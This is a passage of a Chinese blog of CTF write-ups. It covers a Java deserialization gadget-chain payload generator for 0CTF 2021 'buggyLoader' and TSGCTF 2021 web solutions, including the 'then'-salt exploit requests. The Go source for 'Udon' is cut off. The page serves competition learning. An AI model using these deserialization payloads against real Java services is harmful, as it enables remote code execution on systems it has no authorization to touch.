class="string">&quot;amF2YS51dGlsLkhhc2hNYXAFB9rBwxZg0QMAAkYACmxvYWRGYWN0b3JJAAl0aHJlc2hvbGR4cD9A&quot;</span></span><br><span class="line">        + <span class="string">&quot;AAAAAAAAdwgAAAAQAAAAAHh4eA==&quot;</span>);</span><br><span class="line"></span><br><span class="line">    Map hashMapp = <span class="keyword">new</span> HashMap();</span><br><span class="line">    RMIConnector rc = <span class="keyword">new</span> RMIConnector(jurl,hashMapp);</span><br><span class="line"></span><br><span class="line">    Map hashMap = <span class="keyword">new</span> HashMap();</span><br><span class="line">    Map lazyMap = LazyMap.decorate(hashMap, transformer);</span><br><span class="line"></span><br><span class="line">    TiedMapEntry tiedMapEntry = <span class="keyword">new</span> TiedMapEntry(lazyMap, rc);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    HashSet hashSet = <span class="keyword">new</span> HashSet(<span class="number">1</span>);</span><br><span class="line">    hashSet.add(<span class="string">&quot;c014&quot;</span>);</span><br><span class="line">    Field fmap = hashSet.getClass().getDeclaredField(<span class="string">&quot;map&quot;</span>);</span><br><span class="line">    fmap.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">    HashMap innimpl = (HashMap) fmap.get(hashSet);</span><br><span class="line">    Field ftable = hashMap.getClass().getDeclaredField(<span class="string">&quot;table&quot;</span>);</span><br><span class="line">    ftable.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">    Object[] nodes =(Object[])ftable.get(innimpl);</span><br><span class="line">    Object node = nodes[<span class="number">1</span>];</span><br><span class="line">    Field fnode = node.getClass().getDeclaredField(<span class="string">&quot;key&quot;</span>);</span><br><span class="line">    fnode.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">    fnode.set(node, tiedMapEntry);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    oos.writeUTF(<span class="string">&quot;0CTF/TCTF&quot;</span>);</span><br><span class="line">    oos.writeInt(<span class="number">2021</span>);</span><br><span class="line">    oos.writeObject(hashSet);</span><br><span class="line">    oos.close();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">byte</span>[] exp = baos.toByteArray();</span><br><span class="line">    String data = com.yxxx.buggyLoader.Utils.bytesTohexString(exp);</span><br><span class="line">    System.out.println(data);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>





<h2 id="openConnection盲注flag"><a href="#openConnection盲注flag" class="headerlink" title="openConnection盲注flag"></a>openConnection盲注flag</h2><p><a target="_blank" rel="noopener" href="https://github.com/ceclin/0ctf-2021-finals-soln-buggy-loader/blob/main/app/src/main/kotlin/ccl/Blind.kt">https://github.com/ceclin/0ctf-2021-finals-soln-buggy-loader/blob/main/app/src/main/kotlin/ccl/Blind.kt</a></p>
<p>自己看writeup.jpg</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="https://site.ccreater.top/2021/11/18/TCTF2021_BuggyLoader/" data-id="ckw7zwbzt002afmol8cn199q0" data-title="buggyLoader" class="article-share-link">Share</a>
      
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/ctf/" rel="tag">ctf</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/wp/" rel="tag">wp</a></li></ul>

    </footer>
  </div>
  
</article>



  
    <article id="post-TSGCTF2021" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2021/10/03/TSGCTF2021/" class="article-date">
  <time class="dt-published" datetime="2021-10-03T16:00:00.000Z" itemprop="datePublished">2021-10-04</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/web/">web</a>►<a class="article-category-link" href="/categories/web/%E6%AF%94%E8%B5%9B/">比赛</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2021/10/03/TSGCTF2021/">TSGCTF 2021</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h1 id="TSGCTF-2021"><a href="#TSGCTF-2021" class="headerlink" title="TSGCTF 2021"></a>TSGCTF 2021</h1><p>这个比赛感觉挺好的</p>
<h2 id="Welcome-to-TSG-CTF"><a href="#Welcome-to-TSG-CTF" class="headerlink" title="Welcome to TSG CTF!"></a>Welcome to TSG CTF!</h2><p>代码很简单：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> &#123;<span class="attr">promises</span>: fs&#125; = <span class="built_in">require</span>(<span class="string">&#x27;fs&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> fastify = <span class="built_in">require</span>(<span class="string">&#x27;fastify&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> flag = process.env.FLAG || <span class="string">&#x27;DUMMY&#123;DUMMY&#125;&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> app = fastify();</span><br><span class="line">app.get(<span class="string">&#x27;/&#x27;</span>, <span class="keyword">async</span> (_, res) =&gt; &#123;</span><br><span class="line">	res.type(<span class="string">&#x27;text/html&#x27;</span>).send(<span class="keyword">await</span> fs.readFile(<span class="string">&#x27;index.html&#x27;</span>));</span><br><span class="line">&#125;);</span><br><span class="line">app.post(<span class="string">&#x27;/&#x27;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">	<span class="keyword">if</span> (<span class="keyword">typeof</span> req.body === <span class="string">&#x27;object&#x27;</span> &amp;&amp; req.body[flag] === <span class="literal">true</span>) &#123;</span><br><span class="line">		<span class="keyword">return</span> res.send(<span class="string">`Nice! flag is <span class="subst">$&#123;flag&#125;</span>`</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> res.send(<span class="string">`You failed...`</span>);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.listen(<span class="number">34705</span>, <span class="string">&#x27;0.0.0.0&#x27;</span>);</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>程序是要我们猜对flag然后给个flag，但是如果我们知道flag，为啥不直接提交嘞</p>
<p>题目开启着报错</p>
<p>测试一波JSON中的类型那些是object后，得到：null,[],{}</p>
<p>然后req.body==null的话报错下就知道flag了，2333</p>
<h2 id="Beginner’s-Web-2021"><a href="#Beginner’s-Web-2021" class="headerlink" title="Beginner’s Web 2021"></a>Beginner’s Web 2021</h2><p>出题人说这是刚学习ctf的人3小时就能做出来的题目，2333，直到比赛结束我也没做出来</p>
<p>代码也很简单</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> &#123;<span class="attr">promises</span>: fs&#125; = <span class="built_in">require</span>(<span class="string">&#x27;fs&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> crypto = <span class="built_in">require</span>(<span class="string">&#x27;crypto&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> fastify = <span class="built_in">require</span>(<span class="string">&#x27;fastify&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> app = fastify();</span><br><span class="line">app.register(<span class="built_in">require</span>(<span class="string">&#x27;fastify-cookie&#x27;</span>));</span><br><span class="line">app.register(<span class="built_in">require</span>(<span class="string">&#x27;fastify-session&#x27;</span>), &#123;</span><br><span class="line">	<span class="attr">secret</span>: <span class="built_in">Math</span>.random().toString(<span class="number">2</span>),</span><br><span class="line">	<span class="attr">cookie</span>: &#123;<span class="attr">secure</span>: <span class="literal">false</span>&#125;,</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> sessions = <span class="keyword">new</span> <span class="built_in">Map</span>();</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> setRoutes = <span class="keyword">async</span> (session, salt) =&gt; &#123;</span><br><span class="line">	<span class="keyword">const</span> index = <span class="keyword">await</span> fs.readFile(<span class="string">&#x27;index.html&#x27;</span>);</span><br><span class="line"></span><br><span class="line">	session.routes = &#123;</span><br><span class="line">		<span class="attr">flag</span>: <span class="function">() =&gt;</span> <span class="string">&#x27;*** CENSORED ***&#x27;</span>,</span><br><span class="line">		<span class="attr">index</span>: <span class="function">() =&gt;</span> index.toString(),</span><br><span class="line">		<span class="attr">scrypt</span>: <span class="function">(<span class="params">input</span>) =&gt;</span> crypto.scryptSync(input, salt, <span class="number">64</span>).toString(<span class="string">&#x27;hex&#x27;</span>),</span><br><span class="line">		<span class="attr">base64</span>: <span class="function">(<span class="params">input</span>) =&gt;</span> Buffer.from(input).toString(<span class="string">&#x27;base64&#x27;</span>),</span><br><span class="line">		<span class="attr">set_salt</span>: <span class="keyword">async</span> (salt) =&gt; &#123;</span><br><span class="line">			session.routes = <span class="keyword">await</span> setRoutes(session, salt);</span><br><span class="line">			session.salt = salt;</span><br><span class="line">			<span class="keyword">return</span> <span class="string">&#x27;ok&#x27;</span>;</span><br><span class="line">		&#125;,</span><br><span class="line">		[salt]: <span class="function">() =&gt;</span> salt,</span><br><span class="line">	&#125;;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> session.routes;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">app.get(<span class="string">&#x27;/&#x27;</span>, <span class="keyword">async</span> (request, reply) =&gt; &#123;</span><br><span class="line">	<span class="keyword">if</span> (!sessions.has(request.session.sessionId)) &#123;</span><br><span class="line">		sessions.set(request.session.sessionId, &#123;&#125;);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">const</span> session = sessions.get(request.session.sessionId);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (!session.salt) &#123;</span><br><span class="line">		session.salt = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span> (!session.routes) &#123;</span><br><span class="line">		<span class="keyword">await</span> setRoutes(session, <span class="string">&#x27;&#x27;</span>);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">const</span> &#123;action, data&#125; = request.query || &#123;&#125;;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">let</span> route;</span><br><span class="line">	<span class="keyword">switch</span> (action) &#123;</span><br><span class="line">		<span class="keyword">case</span> <span class="string">&#x27;Scrypt&#x27;</span>: route = <span class="string">&#x27;scrypt&#x27;</span>; <span class="keyword">break</span>;</span><br><span class="line">		<span class="keyword">case</span> <span class="string">&#x27;Base64&#x27;</span>: route = <span class="string">&#x27;base64&#x27;</span>; <span class="keyword">break</span>;</span><br><span class="line">		<span class="keyword">case</span> <span class="string">&#x27;SetSalt&#x27;</span>: route = <span class="string">&#x27;set_salt&#x27;</span>; <span class="keyword">break</span>;</span><br><span class="line">		<span class="keyword">case</span> <span class="string">&#x27;GetSalt&#x27;</span>: route = session.salt; <span class="keyword">break</span>;</span><br><span class="line">		<span class="keyword">default</span>: route = <span class="string">&#x27;index&#x27;</span>; <span class="keyword">break</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	reply.type(<span class="string">&#x27;text/html&#x27;</span>)</span><br><span class="line">	<span class="keyword">return</span> session.routes[route](data);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.listen(<span class="number">59101</span>, <span class="string">&#x27;0.0.0.0&#x27;</span>);</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<p>阅读一遍代码发现一处很明显的漏洞点：<code>case &#39;GetSalt&#39;: route = session.salt; break;</code></p>
<p>接着会直接调用<code>session.routes[route](data);</code></p>
<p>但是因为</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">session.routes = &#123;</span><br><span class="line">		<span class="attr">flag</span>: <span class="function">() =&gt;</span> <span class="string">&#x27;*** CENSORED ***&#x27;</span>,</span><br><span class="line">		<span class="attr">index</span>: <span class="function">() =&gt;</span> index.toString(),</span><br><span class="line">		<span class="attr">scrypt</span>: <span class="function">(<span class="params">input</span>) =&gt;</span> crypto.scryptSync(input, salt, <span class="number">64</span>).toString(<span class="string">&#x27;hex&#x27;</span>),</span><br><span class="line">		<span class="attr">base64</span>: <span class="function">(<span class="params">input</span>) =&gt;</span> Buffer.from(input).toString(<span class="string">&#x27;base64&#x27;</span>),</span><br><span class="line">		<span class="attr">set_salt</span>: <span class="keyword">async</span> (salt) =&gt; &#123;</span><br><span class="line">			session.routes = <span class="keyword">await</span> setRoutes(session, salt);</span><br><span class="line">			session.salt = salt;</span><br><span class="line">			<span class="keyword">return</span> <span class="string">&#x27;ok&#x27;</span>;</span><br><span class="line">		&#125;,</span><br><span class="line">		[salt]: <span class="function">() =&gt;</span> salt,</span><br><span class="line">	&#125;;</span><br></pre></td></tr></table></figure>



<p>所以如果salt是存在的键的话，就会覆盖原来的值</p>
<p>继续阅读代码：</p>
<p>session.salt和<code>session.routes.[salt]</code>不是同时赋值的，如果能让<code>session.salt = salt;</code>赋值失败的话，就可以利用上次的salt来访问flag路由了</p>
<p>如果<code>session.routes = await setRoutes(session, salt);</code>是个耗时操作的话可以试试条件竞争，但是很明显不可能的</p>
<p>或者如果能让<code>session.routes = await setRoutes(session, salt);</code>执行之后就退出呢？</p>
<p>到这里我们也只能去了解await的实现</p>
<p>我也不怎么了解await的原理，看了wp之后惊为天人</p>
<p>await的实现可以参考这篇文章</p>
<p><a target="_blank" rel="noopener" href="https://segmentfault.com/a/1190000022638499">https://segmentfault.com/a/1190000022638499</a></p>
<p>快一点的话就直接看官方wp的说明</p>
<blockquote>
<p>The key is <code>set_salt</code> function. Normally, it updates routes and salt together.</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&gt;set_salt: async (salt) =&gt; &#123;</span><br><span class="line">   session.routes = await setRoutes(session, salt);</span><br><span class="line">   session.salt = salt;</span><br><span class="line">   return &#x27;ok&#x27;;</span><br><span class="line">&gt;&#125;,</span><br></pre></td></tr></table></figure>

<p>What if line 2 is executed but line 3 is NEVER executed? It is possible.</p>
<p>In line 2, we are <code>await</code>-ing the execution of <code>setRoutes</code> function. Do you know <code>async</code>/<code>await</code> in ECMAScript is just a syncax sugar of <code>Promise</code>? So, we can transform this function to the following equivalent code.</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&gt;set_salt: (salt) =&gt; &#123;</span><br><span class="line">   return setRoutes(session, salt).then((result) =&gt; &#123;</span><br><span class="line">       session.routes = result;</span><br><span class="line">       session.salt = salt;</span><br><span class="line">       return &#x27;ok&#x27;;</span><br><span class="line">   &#125;);</span><br><span class="line">&gt;&#125;,</span><br></pre></td></tr></table></figure>

<p>The key is that the code is calling the chained method <code>then()</code> from the returned value of <code>setRoutes</code> function. What is the return value of this function?</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&gt;const setRoutes = async (session, salt) =&gt; &#123;</span><br><span class="line">   const index = await fs.readFile(&#x27;index.html&#x27;);</span><br><span class="line"></span><br><span class="line">   session.routes = &#123;</span><br><span class="line">       // redacted</span><br><span class="line">       [salt]: () =&gt; salt,</span><br><span class="line">   &#125;;</span><br><span class="line"></span><br><span class="line">   return session.routes;</span><br><span class="line">&gt;&#125;;</span><br></pre></td></tr></table></figure>

<p>It is returning the result of <code>session.routes</code>. This is unnecessary since the assignment to <code>session.route</code> is already done.</p>
<p>Okay, we can control this value by <code>salt</code> parameter. What if we set <code>salt = &#39;then&#39;</code>? It will return the following object.</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&gt;&#123;</span><br><span class="line">   // redacted</span><br><span class="line">   then: () =&gt; salt,</span><br><span class="line">&gt;&#125;</span><br></pre></td></tr></table></figure>

<p>As you can infer from the above code, this <code>then</code> method will be called with callback function as an argument. If the function is called, the returned value is considered to be <code>resolve</code>-ed and the process continues. But, this <code>then()</code> method is just ignoring the argument and the function is never called.</p>
<p>So, by setting <code>salt = &#39;then&#39;</code>, the assignment to <code>session.routes</code> happens inside <code>setRoutes</code> function, but <code>setRoute</code> function is not resolved and the assignment to <code>session.salt</code> never happens.</p>
<p>So, send <code>GET /?action=SetSalt&amp;data=then</code> to server and this will result in the following session state.</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&gt;session = &#123;</span><br><span class="line">   routes: &#123;</span><br><span class="line">       flag: ...,</span><br><span class="line">       index: ...,</span><br><span class="line">       ...</span><br><span class="line">       then: ...,</span><br><span class="line">   &#125;,</span><br><span class="line">   salt: &#x27;flag&#x27;,</span><br><span class="line">&gt;&#125;</span><br></pre></td></tr></table></figure>

<p>This is what we want to achieve!</p>
</blockquote>
<p>简而言之await是个语法糖，会去调用返回值的then方法，如果返回值没有then方法的话就会调用原型的then方法，</p>
<p>于是我们只要添加then方法就可以代替Promise.then方法了</p>
<p>于是乎：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">/?action=SetSalt&amp;data=flag</span><br><span class="line">/?action=SetSalt&amp;data=then</span><br><span class="line">/?action=GetSalt</span><br></pre></td></tr></table></figure>

<p>这样就拿到flag拉</p>
<h2 id="Udon"><a href="#Udon" class="headerlink" title="Udon"></a>Udon</h2><p>审一审代码，代码还是很简单</p>
<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">	<span class="string">&quot;context&quot;</span></span><br><span class="line">	<span class="string">&quot;crypto/rand&quot;</span></span><br><span class="line">	<span class="string">&quot;log&quot;</span></span><br><span class="line">	<span class="string">&quot;math/big&quot;</span></span><br><span class="line">	<span class="string">&quot;net/http&quot;</span></span><br><span class="line">	<span class="string">&quot;os&quot;</span></span><br><span class="line">	<span class="string">&quot;regexp&quot;</span></span><br><span class="line">	<span class="string">&quot;time&quot;</span></span><br><span class="line"></span><br><span class="line">	<span class="string">&quot;github.com/gin-gonic/gin&quot;</span></span><br><span class="line">	<span class="string">&quot;gorm.io/driver/sqlite&quot;</span></span><br><span class="line">	<span class="string">&quot;gorm.io/gorm&quot;</span></span><br><span class="line"></span><br><span class="line">	<span class="string">&quot;github.com/go-redis/redis/v8&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> Post <span class="keyword">struct</span> &#123;</span><br><span class="line">	ID          <span class="keyword">string</span>    <span class="string">`gorm:&quot;primaryKey&quot;`</span></span><br><span class="line">	UID         <span class="keyword">string</span>    <span class="string">`gorm:&quot;column:uid&quot;`</span></span><br><span class="line">	Title       <span class="keyword">string</span>    <span class="string">`gorm:&quot;column:title&quot;`</span></span><br><span class="line">	Description <span class="keyword">string</span>    <span class="string">`gorm:&quot;column:description&quot;`</span></span><br><span class="line">	CreatedAt   time.Time <span class="string">`gorm:&quot;column:created_at&quot;`</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> letters = <span class="string">&quot;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">randomString</span><span class="params">(n <span class="keyword">int</span>)</span> <span class="params">(<span class="keyword">string</span>, error)</span></span> &#123;</span><br><span class="line">	b := <span class="built_in">make</span>([]<span class="keyword">byte</span>, n)</span><br><span class="line">	<span class="keyword">for</span> i := <span class="keyword">range</span> b &#123;</span><br><span class="line">		idx, err := rand.Int(rand.Reader, big.NewInt(<span class="keyword">int64</span>(<span class="built_in">len</span>(letters))))</span><br><span class="line">		<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">			<span class="keyword">return</span> <span class="string">&quot;&quot;</span>, err</span><br><span class="line">		&#125;</span><br><span class="line">		b[i] = letters[idx.Int64()]</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="keyword">string</span>(b), <span class="literal">nil</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(p *Post)</span> <span class="title">BeforeCreate</span><span class="params">(tx *gorm.DB)</span> <span class="params">(err error)</span></span> &#123;</span><br><span class="line">	p.ID, err = randomString(<span class="number">10</span>)</span><br><span class="line">	<span class="keyword">return</span> err</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">	<span class="comment">// datastores</span></span><br><span class="line">	<span class="comment">/////</span></span><br><span class="line"></span><br><span class="line">	db, err := gorm.Open(sqlite.Open(<span class="string">&quot;database.db&quot;</span>), &amp;gorm.Config&#123;&#125;)</span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">		log.Fatalf(<span class="string">&quot;failed to open a database: %s&quot;</span>, err.Error())</span><br><span class="line">	&#125;</span><br><span class="line">	db.AutoMigrate(&amp;Post&#123;&#125;)</span><br><span class="line"></span><br><span class="line">	posts := []Post&#123;&#125;</span><br><span class="line">	db.Where(<span class="string">&quot;uid = ?&quot;</span>, os.Getenv(<span class="string">&quot;ADMIN_UID&quot;</span>)).Find(&amp;posts)</span><br><span class="line">	<span class="keyword">if</span> <span class="built_in">len</span>(posts) == <span class="number">0</span> &#123;</span><br><span class="line">		db.Create(&amp;Post&#123;</span><br><span class="line">			UID:         os.Getenv(<span class="string">&quot;ADMIN_UID&quot;</span>),</span><br><span class="line">			Title:       <span class="string">&quot;flag&quot;</span>,</span><br><span class="line">			Description: os.Getenv(<span class="string">&quot;FLAG&quot;</span>),</span><br><span class="line">		&#125;)</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	rdb := redis.NewClient(&amp;redis.Options&#123;</span><br><span class="line">		Addr:     <span class="string">&quot;redis:6379&quot;</span>,</span><br><span class="line">		Password: <span class="string">&quot;&quot;</span>,</span><br><span class="line">		DB:       <span class="number">0</span>,</span><br><span class="line">	&#125;)</span><br><span class="line"></span><br><span class="line">	<span class="comment">// misc configurations</span></span><br><span class="line">	<span class="comment">/////</span></span><br><span class="line"></span><br><span class="line">	r := gin.Default()</span><br><span class="line">	r.LoadHTMLGlob(<span class="string">&quot;./templates/*.html&quot;</span>)</span><br><span class="line">	r.Static(<span class="string">&quot;/assets&quot;</span>, <span class="string">&quot;./assets&quot;</span>)</span><br><span class="line"></span><br><span class="line">	r.Use(<span class="function"><span class="keyword">func</span><span class="params">(c *gin.Context)</span></span> &#123;</span><br><span class="line">		c.Header(<span class="string">&quot;Content-Security-Policy&quot;</span>, <span class="string">&quot;script-src &#x27;self&#x27;; style-src &#x27;self&#x27;; base-uri &#x27;none&#x27;&quot;</span>)</span><br><span class="line">		c.Next()</span><br><span class="line">	&#125;)</span><br><span class="line"></span><br><span class="line">	r.Use(<span class="function"><span class="keyword">func</span><span class="params">(c *gin.Context)</span></span> &#123;</span><br><span class="line">		k := c.Query(<span 